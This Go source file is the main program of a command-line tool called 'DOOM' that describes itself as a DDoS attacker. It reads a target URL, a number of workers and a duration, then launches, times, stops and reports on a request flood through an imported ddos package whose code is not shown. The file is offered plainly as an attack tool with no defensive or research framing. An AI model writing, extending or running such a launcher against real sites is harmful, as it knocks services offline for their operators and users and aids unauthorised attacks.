package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	ddos "github.com/ginozza/doom/pkg/ddos"
)

func main() {
	// Define flags for URL, number of workers, and duration
	urlPtr := flag.String("url", "", "URL for the DDoS attack")
	workersPtr := flag.Int("workers", 1, "Number of workers for the DDoS attack")
	durationPtr := flag.Int("duration", 10, "Duration of the attack in seconds")

	// Parse the flags
	flag.Parse()

	// Validate the arguments
	if *urlPtr == "" {
		log.Fatalf("Error: URL must be provided.")
	}
	if *workersPtr < 1 {
		log.Fatalf("Error: Number of workers must be at least 1.")
	}

	// Initialize the DDoS attack
	attack, err := ddos.New(*urlPtr, *workersPtr)
	if err != nil {
		log.Fatalf("Error creating DDoS attack: %v", err)
	}

	// Start the DDoS attack
	fmt.Println(`
------------------------------------------------
                    DOOM
------------------------------------------------
       Starting the DDoS attack...
------------------------------------------------`)
	attack.Run()

	// Wait for the specified duration
	time.Sleep(time.Duration(*durationPtr) * time.Second)

	// Stop the DDoS attack
	fmt.Println(`
------------------------------------------------
       Stopping the DDoS attack...
------------------------------------------------`)

	attack.Stop()

	// Retrieve and display the results
	success, total := attack.Result()
	fmt.Printf(`
------------------------------------------------
           Doom Attack Completed
------------------------------------------------
       Successful Requests: %d
       Total Requests: %d
------------------------------------------------
`, success, total)
}
